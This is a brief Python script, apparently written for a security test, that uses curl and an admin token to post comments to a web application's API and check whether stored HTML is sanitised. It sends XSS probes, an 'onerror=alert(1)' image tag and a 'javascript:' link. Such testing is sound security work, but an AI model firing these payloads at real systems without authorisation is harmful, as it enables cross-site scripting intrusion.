import json,subprocess,os,uuid
H=os.environ['H']; BB=os.environ['BB']
TOK=open('/tmp/bac_SYSADMIN').read().strip()
tag='ZXL'+uuid.uuid4().hex[:5]
def post(html):
    body={"comment":{"type":"Comment","commentable_type":"ExceptionRequest",
                     "commentable_id":33,"message_raw":html,"message_html":html}}
    cmd=['curl','-s','-m','30','-o','/tmp/b','-w','%{http_code}','-X','POST',H+'/api/v1/comments',
         '-H','token: '+TOK,'-H',BB,'-H','Content-Type: application/json',
         '-H','X-Auditboard-Product: System','-d',json.dumps(body)]
    c=subprocess.run(cmd,capture_output=True,text=True).stdout.strip()
    return c, open('/tmp/b',encoding='utf-8',errors='replace').read()
print("=== is message_html sanitised SERVER-side? (send raw, read back) ===")
cases=[
 ('b-kept',   f'<b>{tag}</b>'),
 ('i-kept',   f'<i>{tag}</i>'),
 ('img-strip',f'<img/src=x/onerror=alert(1)>{tag}'),
 ('a-http',   f'<a href="https://example.com">{tag}</a>'),
 ('a-js',     f'<a href="javascript&colon;alert(1)">{tag}</a>'),
]
for label,h in cases:
    c,b=post(h)
    if c in ('200','201'):
        o=json.loads(b)['comments'][0]
        print(f"  {label:12} sent={h[:44]!r}")
        print(f"               stored_html={o.get('message_html')!r}")
    else:
        print(f"  {label:12} {c}")
